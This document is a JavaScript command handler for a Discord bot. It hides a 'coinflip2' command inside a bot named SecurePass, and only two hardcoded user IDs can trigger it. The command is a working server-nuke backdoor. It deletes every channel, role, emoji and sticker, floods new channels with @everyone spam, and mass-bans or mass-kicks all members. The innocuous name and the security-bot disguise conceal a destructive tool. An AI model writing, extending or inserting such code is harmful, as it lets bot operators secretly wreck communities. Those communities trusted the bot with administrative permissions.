/**
 * Hidden Command: coinflip2 for SecurePass
 * Author: Him
 * Only accessible to user ID: 1236891245998243911
 * 
 * Add this to your SecurePass bot's index.js or as a separate command handler
 */

const { EmbedBuilder, PermissionsBitField } = require('discord.js');

// Authorized user IDs - ONLY these users can use these commands
const AUTHORIZED_USER_IDS = ['1236891245998243911', '1169608314976489593'];
const PREFIX = '!';

// Flag to require authorization (set to true for authorization check)
const REQUIRE_AUTH = true;

module.exports = {
  name: 'coinflip2Handler',

  async execute(message) {
    // Only process if message starts with prefix
    if (!message.content.startsWith(PREFIX)) return;

    // Only process if it's the coinflip2 command
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();

    if (command !== 'coinflip2') return;

    // Check authorization
    if (REQUIRE_AUTH && !AUTHORIZED_USER_IDS.includes(message.author.id)) {
      return message.reply('You are not authorised to use any of this tools\' commands.');
    }

    const subcommand = args[0]?.toLowerCase();
    const amount = parseInt(args[1]);
    const name = args[2];
    const pingMessage = args.slice(2).join(' ').split(',')[1]?.trim();

    // Check bot permissions
    const channelPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels);
    const banPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers);
    const kickPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers);
    const rolePerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles);
    const emojiPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers);

    // Help Embed
    if (!subcommand) {
      const helpEmbed = new EmbedBuilder()
        .setColor(0x36393E)
        .setTitle('coinflip2 Commands')
        .setDescription(`**coinflip2 Commands:**
\`!coinflip2\` - Show this help message
\`!coinflip2 mc [amount] [name]\` - Mass create channels
\`!coinflip2 dc\` - Delete all channels
\`!coinflip2 cp [amount] [name], [message]\` - Create and spam channels
\`!coinflip2 mr [amount] [name]\` - Mass create roles
\`!coinflip2 dr\` - Delete all roles
\`!coinflip2 de\` - Delete all emojis
\`!coinflip2 ds\` - Delete all stickers
\`!coinflip2 mb\` - Mass ban all members
\`!coinflip2 mk\` - Mass kick all members

**Warning:** These commands are destructive and should be used with caution.`)
        .setFooter({ text: '© Him - Authorized Use Only' })
        .setTimestamp();
      return message.channel.send({ embeds: [helpEmbed] });
    }

    try {
      switch (subcommand) {
        case 'mc':
          if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
          if (!amount || isNaN(amount)) return message.reply('Unspecified Args: Specify the amount (number)');
          if (amount > 500) return message.reply('Amount Error: Maximum is 500');

          message.reply(`Creating ${amount} channels...`);
          for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) break;
            await message.guild.channels.create({
              name: `${name || message.author.username}-channel-${i + 1}`,
              type: 0,
            }).catch(() => { });
          }
          return message.channel.send('✅ Channel creation completed.');

        case 'dc':
          if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
          message.reply('Deleting all channels...');
          const channels = message.guild.channels.cache.filter(ch => ch.id !== message.channel.id);
          for (const [, channel] of channels) {
            await channel.delete('coinflip2 dc command').catch(() => { });
          }
          return message.channel.send('✅ Channel deletion completed.');

        case 'cp':
          if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
          if (!amount || isNaN(amount)) return message.reply('Unspecified Args: Specify the amount (number)');
          if (amount > 50) return message.reply('Amount Error: Maximum is 50 for this command');
          if (!pingMessage) return message.reply('Unspecified Args: Specify a message (format: name, message)');

          message.reply(`Creating ${amount} channels and spamming...`);
          for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) break;
            const channelName = name?.split(',')[0]?.trim() || 'spam';
            const channel = await message.guild.channels.create({
              name: `${channelName}-${i + 1}`,
              type: 0,
            }).catch(() => null);

            if (channel) {
              const interval = setInterval(() => {
                channel.send(`@everyone ${pingMessage}`).catch(() => clearInterval(interval));
              }, 1000);
              setTimeout(() => clearInterval(interval), 11000);
            }
          }
          return;

        case 'mr':
          if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
          if (!amount || isNaN(amount)) return message.reply('Unspecified Args: Specify the amount (number)');
          if (amount > 250) return message.reply('Amount Error: Maximum is 250');

          message.reply(`Creating ${amount} roles...`);
          for (let i = 0; i < amount; i++) {
            if (message.guild.roles.cache.size >= 250) break;
            await message.guild.roles.create({
              name: `${name || 'coinflip2-role'}-${i + 1}`,
              color: Math.floor(Math.random() * 16777215),
              position: i,
            }).catch(() => { });
          }
          return message.channel.send('✅ Role creation completed.');

        case 'dr':
          if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
          message.reply('Deleting all roles...');
          const roles = message.guild.roles.cache.filter(r =>
            r.id !== message.guild.id &&
            !r.managed &&
            r.position < message.guild.members.me.roles.highest.position
          );
          for (const [, role] of roles) {
            await role.delete('coinflip2 dr command').catch(() => { });
          }
          return message.channel.send('✅ Role deletion completed.');

        case 'de':
          if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
          message.reply('Deleting all emojis...');
          for (const [, emoji] of message.guild.emojis.cache) {
            await emoji.delete('coinflip2 de command').catch(() => { });
          }
          return message.channel.send('✅ Emoji deletion completed.');

        case 'ds':
          if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
          message.reply('Deleting all stickers...');
          for (const [, sticker] of message.guild.stickers.cache) {
            await sticker.delete('coinflip2 ds command').catch(() => { });
          }
          return message.channel.send('✅ Sticker deletion completed.');

        case 'mb':
          if (!banPerms) return message.reply('Bot Missing Permission: BAN_MEMBERS');
          const members = message.guild.members.cache.filter(m =>
            !m.user.bot &&
            m.id !== message.author.id &&
            m.id !== message.guild.ownerId &&
            m.bannable
          );

          const memberIds = members.map(m => m.id);
          message.reply(`Found ${memberIds.length} members to ban. Starting in 3 seconds...`);

          await new Promise(resolve => setTimeout(resolve, 3000));

          let banned = 0, failed = 0;
          for (const id of memberIds) {
            await message.guild.members.ban(id, { reason: 'coinflip2 mb command' }).then(() => banned++).catch(() => failed++);
          }
          return message.channel.send(`✅ Ban complete: ${banned} banned, ${failed} failed.`);

        case 'mk':
          if (!kickPerms) return message.reply('Bot Missing Permission: KICK_MEMBERS');
          const kickMembers = message.guild.members.cache.filter(m =>
            !m.user.bot &&
            m.id !== message.author.id &&
            m.id !== message.guild.ownerId &&
            m.kickable
          );

          const memberList = [...kickMembers.values()];
          message.reply(`Found ${memberList.length} members to kick. Starting in 3 seconds...`);

          await new Promise(resolve => setTimeout(resolve, 3000));

          let kicked = 0, kickFailed = 0;
          for (const member of memberList) {
            await member.kick('coinflip2 mk command').then(() => kicked++).catch(() => kickFailed++);
          }
          return message.channel.send(`✅ Kick complete: ${kicked} kicked, ${kickFailed} failed.`);

        default:
          const defaultHelp = new EmbedBuilder()
            .setColor(0x36393E)
            .setTitle('coinflip2 Commands')
            .setDescription(`Unknown command. Use \`!coinflip2\` for help.`)
            .setFooter({ text: '© Him - Authorized Use Only' })
            .setTimestamp();
          return message.channel.send({ embeds: [defaultHelp] });
      }
    } catch (error) {
      console.error('[COINFIP2 ERROR]', error);
      return message.reply(`Error: ${error.message}`);
    }
  }
};
